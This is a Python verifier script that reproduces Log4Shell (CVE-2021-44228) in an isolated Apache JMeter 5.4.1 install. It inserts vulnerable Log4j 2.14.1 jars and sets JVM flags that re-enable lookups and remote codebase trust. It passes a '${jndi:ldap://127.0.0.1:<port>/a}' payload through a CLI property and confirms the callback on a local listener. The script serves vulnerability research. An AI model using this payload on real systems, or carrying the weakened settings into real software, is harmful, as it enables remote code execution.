#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import socket
import subprocess
import tarfile
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_jmeter_5_4_1_v1_log4j_real_entrypoint"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
LOG4J_CACHE = LEGACY_ROOT / "historical-scan" / "maven-log4j-2.14.1"
ARCHIVE = LEGACY_ROOT / "samples" / "CVE-2021-44228__apache_jmeter_5_4_1" / "apache-jmeter-5.4.1.tgz"
V1_RUNTIME_JARS = {"log4j-api-2.14.1.jar", "log4j-core-2.14.1.jar"}
LOG4J_JARS = {
    "log4j-api-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
    "log4j-slf4j-impl-2.14.1.jar": LOG4J_CACHE / "log4j-slf4j-impl-2.14.1.jar",
    "log4j-1.2-api-2.14.1.jar": LOG4J_CACHE / "log4j-1.2-api-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_core(jar_path):
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "jndi_lookup_class_present": False,
        "jndi_manager_class_present": False,
        "version_2_14_1": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_lookup_class_present"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["jndi_manager_class_present"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
        props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
        if props in names:
            result["version_2_14_1"] = "version=2.14.1" in zf.read(props).decode("utf-8", "replace")
    return result


def replace_log4j(jmeter_dir):
    lib = jmeter_dir / "lib"
    before = sorted(p.name for p in lib.glob("log4j-*.jar"))
    copied = {}
    for target_name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        artifact = target_name.rsplit("-", 1)[0]
        for old in lib.glob(f"{artifact}-*.jar"):
            old.unlink()
        target = lib / target_name
        shutil.copy2(source, target)
        copied[target_name] = {
            "source": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target": sha256(target),
            "is_generated_v1_runtime_jar": target_name in V1_RUNTIME_JARS,
        }
    after = sorted(p.name for p in lib.glob("log4j-*.jar"))
    return {
        "before": before,
        "copied": copied,
        "after": after,
        "log4j_core": inspect_core(lib / "log4j-core-2.14.1.jar"),
    }


def ensure_jmeter(evidence_dir):
    run_dir = evidence_dir / "runtime"
    if run_dir.exists():
        shutil.rmtree(run_dir)
    run_dir.mkdir(parents=True)
    if not ARCHIVE.exists():
        raise FileNotFoundError(ARCHIVE)
    with tarfile.open(ARCHIVE, "r:gz") as tar:
        tar.extractall(run_dir)
    jmeter_dir = run_dir / "apache-jmeter-5.4.1"
    return jmeter_dir, replace_log4j(jmeter_dir)


def start_listener(evidence_dir, case_name, timeout=10):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-listener-port.txt").write_text(str(port_box["port"]), encoding="utf-8")
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})
                try:
                    conn.sendall(bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0]))
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"{case_name} listener did not start")
    return port_box["port"], received, thread


def run_case(jmeter_bin, evidence_dir, case_name, value_factory, timeout=12):
    port, received, thread = start_listener(evidence_dir, case_name, timeout=timeout)
    value = value_factory(port) if callable(value_factory) else value_factory
    cmd = [str(jmeter_bin), "-n", "-Jprobe=" + value, "-v"]
    env = os.environ.copy()
    env["JVM_ARGS"] = "-Dlog4j2.formatMsgNoLookups=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=true"
    env["JAVA_TOOL_OPTIONS"] = ""

    started = time.time()
    proc = subprocess.run(
        cmd,
        cwd=str(jmeter_bin.parent),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=timeout + 5,
    )
    thread.join(timeout)
    output = proc.stdout
    result = {
        "case": case_name,
        "cmd": cmd,
        "duration_seconds": round(time.time() - started, 3),
        "value": value,
        "received": received,
        "received_count": len(received),
        "returncode": proc.returncode,
        "stdout_contains_jmeter_initialize_properties": "org.apache.jmeter.JMeter.initializeProperties" in output,
        "stdout_contains_jndi_lookup": "org.apache.logging.log4j.core.lookup.JndiLookup.lookup" in output,
        "stdout_contains_value": value in output,
        "stdout_tail": output[-5000:],
    }
    (evidence_dir / f"{case_name}.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return result


def main():
    global ROOT
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    ROOT = Path(args.workdir)
    sample_dir = ROOT / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    if args.fresh and evidence_dir.exists():
        shutil.rmtree(evidence_dir)
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")

    jmeter_dir, replacement = ensure_jmeter(evidence_dir)
    jmeter_bin = jmeter_dir / "bin" / "jmeter"
    jars = sorted(str(p.relative_to(jmeter_dir)) for p in jmeter_dir.glob("lib/log4j-*.jar"))
    dep = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache JMeter 5.4.1 binary with "
            "generated v1 Log4j 2.14.1 api/core jars copied from .m2-poc into lib, plus "
            "auxiliary Log4j bridge jars copied from the legacy cache"
        ),
        "runtime_replacement": replacement,
        "runtime_log4j_jars_after_insertion": jars,
    }
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(dep, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "dependency-evidence.txt").write_text("\n".join(jars) + "\n", encoding="utf-8")

    with run_log.open("a", encoding="utf-8") as log:
        log.write(f"jmeter_bin={jmeter_bin}\n")
        log.write("dependency_jars:\n" + "\n".join(jars) + "\n")

    positive = run_case(
        jmeter_bin,
        evidence_dir,
        "property_cli_payload",
        lambda port: "${jndi:ldap://127.0.0.1:%d/a}" % port,
    )
    negative = run_case(
        jmeter_bin,
        evidence_dir,
        "property_cli_control",
        "strict_control_no_jndi",
    )

    confirmed = (
        positive["received_count"] > 0
        and positive["stdout_contains_jndi_lookup"]
        and positive["stdout_contains_jmeter_initialize_properties"]
        and negative["received_count"] == 0
        and all(
            name in replacement["copied"]
            and replacement["copied"][name]["is_generated_v1_runtime_jar"]
            for name in V1_RUNTIME_JARS
        )
        and replacement["log4j_core"]["version_2_14_1"]
        and replacement["log4j_core"]["jndi_lookup_class_present"]
        and replacement["log4j_core"]["jndi_manager_class_present"]
    )
    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/jmeter",
        "downstream_application": "Apache JMeter 5.4.1",
        "downstream_entrypoint": "bin/jmeter real CLI property loading",
        "downstream": "Apache JMeter 5.4.1",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(ARCHIVE),
        "dependency_evidence": dep,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "attack_surface": "JMeter CLI property loading via -J<name>=<value>",
        "payload": positive["value"],
        "dynamic_signal": {
            "positive_listener_received_count": positive["received_count"],
            "positive_listener_received": positive["received"],
            "positive_stdout_contains_jndi_lookup": positive["stdout_contains_jndi_lookup"],
            "positive_stdout_contains_jmeter_initialize_properties": positive["stdout_contains_jmeter_initialize_properties"],
            "negative_listener_received_count": negative["received_count"],
            "generated_v1_jars_inserted": all(name in replacement["copied"] for name in V1_RUNTIME_JARS),
            "jndi_lookup_class_present": replacement["log4j_core"]["jndi_lookup_class_present"],
            "jndi_manager_class_present": replacement["log4j_core"]["jndi_manager_class_present"],
        },
        "positive": {
            "listener_received_count": positive["received_count"],
            "listener_received": positive["received"],
            "stdout_contains_jndi_lookup": positive["stdout_contains_jndi_lookup"],
            "stdout_contains_jmeter_initialize_properties": positive["stdout_contains_jmeter_initialize_properties"],
        },
        "negative": {
            "listener_received_count": negative["received_count"],
        },
        "cases": [positive, negative],
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_jmeter_log4j_v1_inserted.py"),
        "notes": "The verifier does not execute .cve_poc_local. It inserts the generated v1 Log4j api/core 2.14.1 runtime jars into an isolated JMeter distribution and triggers Log4Shell through JMeter's real CLI property loading path.",
    }
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    listener_hex = positive["received"][0].get("data_hex", "") if positive["received"] else ""
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_listener_received_count={positive['received_count']}\n"
        f"listener_data_hex={listener_hex}\n"
        f"negative_listener_received_count={negative['received_count']}\n"
        f"stdout_contains_jndi_lookup={int(positive['stdout_contains_jndi_lookup'])}\n"
        f"stdout_contains_jmeter_initialize_properties={int(positive['stdout_contains_jmeter_initialize_properties'])}\n"
        f"jndi_lookup_class_present={int(replacement['log4j_core']['jndi_lookup_class_present'])}\n"
        f"jndi_manager_class_present={int(replacement['log4j_core']['jndi_manager_class_present'])}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache JMeter 5.4.1 "
        "binary into an isolated runtime and copies generated v1 Log4j 2.14.1 `api` and `core` jars "
        "from `.m2-poc` into `lib`, with auxiliary Log4j bridge jars from the legacy cache.\n\n"
        "The positive run executes `bin/jmeter -n -Jprobe=${jndi:ldap://127.0.0.1:<port>/a} -v`; "
        "JMeter initializes CLI properties and Log4j evaluates the payload, producing one LDAP bind. "
        "The negative run uses the same CLI property path with a non-JNDI control value and receives no callback.\n\n"
        "Run: `python3 scripts/verify_jmeter_log4j_v1_inserted.py` from `/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
